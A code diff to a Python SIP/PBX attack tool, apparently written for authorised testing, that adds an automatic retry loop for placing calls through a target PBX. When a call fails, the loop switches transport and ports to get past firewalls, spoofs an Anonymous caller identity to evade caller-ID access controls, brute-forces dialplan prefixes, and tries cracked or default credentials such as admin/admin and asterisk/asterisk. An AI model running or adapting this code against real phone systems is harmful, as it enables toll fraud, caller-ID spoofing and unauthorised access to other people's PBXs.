@@ -465,10 +465,15 @@ def main() -> int:
         public_ip = resolve_public_ip(stun_server=stun_arg, timeout=args.timeout)
         if public_ip:
             _ok(f"Public IP (reflexive): {col.BOLD}{public_ip}{col.RESET} — patched into SIP Via/Contact", col)
-            if not args.source_ip:
-                args.source_ip = public_ip
+            # Always override: STUN public IP is the correct Contact/Via address
+            # even if --network pre-set a private interface IP.
+            args.source_ip = public_ip
+            _stun_public_ip = public_ip
         else:
             _warn("STUN lookup failed — continuing with local IP (may fail behind NAT)", col)
+            _stun_public_ip: str | None = None
+    else:
+        _stun_public_ip = None
 
     operator, scope_sha = authorize(args, col)
 
@@ -832,22 +837,155 @@ def main() -> int:
                   f"{col.BOLD}{effective_call_to}{col.RESET}  "
                   f"mode={_mode_label}  srtp={args.srtp}", col)
 
+            # ── Adaptive self-healing call loop ──────────────────────────────
+            # Try progressively corrected configurations until the call succeeds
+            # or all remediation strategies are exhausted.
             _jitter_sleep(args.jitter)
-            result = call.place_call(
-                h.ip, effective_call_to, call_from,
-                port=args.port,
-                username=username, password=password,
-                timeout=args.timeout, dry_run=args.call_dry_run,
-                call_duration=_poc_duration,
-                traffic_log=traffic_log,
-                pai=args.pai, diversion=args.diversion,
-                privacy=args.privacy, remote_party_id=args.remote_party_id,
-                from_display=args.from_display,
-                source_ip=args.source_ip,
-                source_port_range=source_port_range,
-                srtp=args.srtp,
-                dtmf_digits=args.call_dtmf or "",
-            )
+
+            def _try_call(label: str, **overrides) -> "call.CallResult":
+                _kw = dict(
+                    port=args.port,
+                    username=username, password=password,
+                    timeout=args.timeout, dry_run=args.call_dry_run,
+                    call_duration=_poc_duration,
+                    traffic_log=traffic_log,
+                    pai=args.pai, diversion=args.diversion,
+                    privacy=args.privacy, remote_party_id=args.remote_party_id,
+                    from_display=args.from_display,
+                    source_ip=args.source_ip,
+                    source_port_range=source_port_range,
+                    srtp=args.srtp,
+                    dtmf_digits=args.call_dtmf or "",
+                )
+                _kw.update(overrides)
+                _info(f"  {col.BOLD}[ATTEMPT]{col.RESET} {label}  "
+                      f"source={_kw['source_ip'] or '(auto)'}  "
+                      f"transport={'TCP' if _kw.get('tcp') else 'UDP'}  "
+                      f"port={_kw['port']}", col)
+                _r = call.place_call(h.ip, effective_call_to, call_from, **_kw)
+                _sym = (f"{col.GREEN}✓{col.RESET}" if _r.success else
+                        f"{col.YELLOW}~{col.RESET}" if _r.reached_dialplan else
+                        f"{col.RED}✗{col.RESET}")
+                _code = _r.status_code or "T/O"
+                _info(f"  {_sym} Result: [{_code}] {_r.reason or 'timeout'}  "
+                      f"dialplan={'YES' if _r.reached_dialplan else 'NO'}  "
+                      f"confirmed={'YES' if _r.call_confirmed else 'NO'}", col)
+                return _r
+
+            _attempts: list[tuple[str, "call.CallResult"]] = []
+
+            # ── Attempt 1: Best-effort with current config ─────────────────
+            result = _try_call("Initial attempt (current config)")
+            _attempts.append(("initial", result))
+
+            # ── Auto-fix decision tree ─────────────────────────────────────
+            if not result.success and not result.reached_dialplan:
+                code = result.status_code
+
+                # A) Timeout + NAT suspected → retry with STUN public IP
+                if code is None and result.nat_suspected and _stun_public_ip and \
+                        _stun_public_ip != args.source_ip:
+                    _info(f"  {col.YELLOW}AUTO-FIX A:{col.RESET} NAT detected — retrying with "
+                          f"STUN public IP {_stun_public_ip}", col)
+                    result = _try_call("NAT fix: STUN public IP as Contact/Via",
+                                       source_ip=_stun_public_ip)
+                    _attempts.append(("nat-fix-stun", result))
+
+                # B) Still timing out → try TCP transport
+                if not result.success and not result.reached_dialplan and \
+                        result.status_code is None:
+                    _info(f"  {col.YELLOW}AUTO-FIX B:{col.RESET} UDP timeout — retrying via "
+                          f"TCP transport (bypasses some firewalls)", col)
+                    _tcp_src = _stun_public_ip or args.source_ip
+                    result = _try_call("TCP transport fallback",
+                                       source_ip=_tcp_src, tcp=True,
+                                       timeout=max(args.timeout, 8.0))
+                    _attempts.append(("tcp-fallback", result))
+
+                # C) Try alternate SIP port 5080 (some PBX systems)
+                if not result.success and not result.reached_dialplan and \
+                        result.status_code is None and args.port == 5060:
+                    _info(f"  {col.YELLOW}AUTO-FIX C:{col.RESET} Trying SIP port 5080 "
+                          f"(common alternate PBX port)", col)
+                    result = _try_call("Alt port 5080 (some Asterisk configs)",
+                                       port=5080, source_ip=_stun_public_ip or args.source_ip)
+                    _attempts.append(("alt-port-5080", result))
+
+                # D) 403 Forbidden → try with Anonymous/From-header spoofing
+                if result.status_code == 403:
+                    _info(f"  {col.YELLOW}AUTO-FIX D:{col.RESET} 403 Forbidden — retrying with "
+                          f"Anonymous identity spoof (bypass CLI-based ACL)", col)
+                    result = _try_call(
+                        "Identity spoof: Anonymous From + P-Asserted-Identity",
+                        from_display="Anonymous",
+                        pai=f"sip:anonymous@{h.ip}",
+                        privacy="id;header;session",
+                        source_ip=_stun_public_ip or args.source_ip,
+                    )
+                    _attempts.append(("403-identity-spoof", result))
+
+                # E) 404 Not Found → run prefix discovery and retry with found prefix
+                if result.status_code == 404 and not args.discover_prefix:
+                    _info(f"  {col.YELLOW}AUTO-FIX E:{col.RESET} 404 Not Found — auto-running "
+                          f"prefix discovery to find correct dialplan access code", col)
+                    _pfx_list = call.prefixes_for_fingerprint(h.fingerprint)
+                    _auto_pfx, _auto_dest = call.discover_dialplan_prefix(
+                        h.ip, effective_call_to, call_from,
+                        port=args.port, timeout=args.timeout,
+                        source_ip=_stun_public_ip or args.source_ip,
+                        prefixes=_pfx_list,
+                    )
+                    if _auto_pfx is not None:
+                        _info(f"  {col.GREEN}PREFIX FOUND:{col.RESET} {repr(_auto_pfx)} → "
+                              f"{_auto_dest}", col)
+                        effective_call_to = _auto_dest
+                        result = _try_call(
+                            f"Retry with discovered prefix {repr(_auto_pfx)}",
+                            source_ip=_stun_public_ip or args.source_ip,
+                        )
+                        _attempts.append(("prefix-auto-discovered", result))
+                    else:
+                        _warn("  AUTO-FIX E: No working prefix found — PBX may require auth", col)
+
+                # F) 401/407 Auth required — try AMI-cracked creds if available
+                if result.status_code in (401, 407):
+                    _ami_creds = [(c["username"], c["password"])
+                                  for c in hr.get("credentials_found", [])]
+                    if not _ami_creds:
+                        # Try common defaults
+                        _ami_creds = [("1000", "1000"), ("admin", "admin"),
+                                      ("asterisk", "asterisk"), (call_from, call_from),
+                                      (call_from, "1234"), (call_from, "")]
+                    _info(f"  {col.YELLOW}AUTO-FIX F:{col.RESET} Auth required — trying "
+                          f"{len(_ami_creds)} credential set(s)", col)
+                    for _au, _ap in _ami_creds:
+                        _r_auth = _try_call(
+                            f"Auth retry: {_au}/{'*'*len(_ap or '')}",
+                            username=_au, password=_ap,
+                            source_ip=_stun_public_ip or args.source_ip,
+                        )
+                        _attempts.append((f"auth-{_au}", _r_auth))
+                        if _r_auth.success or _r_auth.reached_dialplan:
+                            result = _r_auth
+                            break
+
+            # ── Log all attempts summary ───────────────────────────────────
+            if len(_attempts) > 1:
+                _info("", col)
+                _info(f"  {'─'*54}", col)
+                _info(f"  ADAPTIVE RETRY SUMMARY ({len(_attempts)} attempts)", col)
+                _info(f"  {'─'*54}", col)
+                for _aname, _ar in _attempts:
+                    _asym = ("✓ SUCCESS" if _ar.success else
+                             "~ DIALPLAN" if _ar.reached_dialplan else
+                             f"✗ [{_ar.status_code or 'T/O'}]")
+                    _info(f"  {_asym:<14}  {_aname}", col)
+                _info(f"  {'─'*54}", col)
+                _info(f"  Best result: [{result.status_code or 'T/O'}] "
+                      f"dialplan={result.reached_dialplan}  "
+                      f"success={result.success}", col)
+                _info(f"  {'─'*54}", col)
+                _info("", col)
             hr["call_test"] = {
                 "call_to": effective_call_to, "call_from": call_from,
                 "success": result.success,
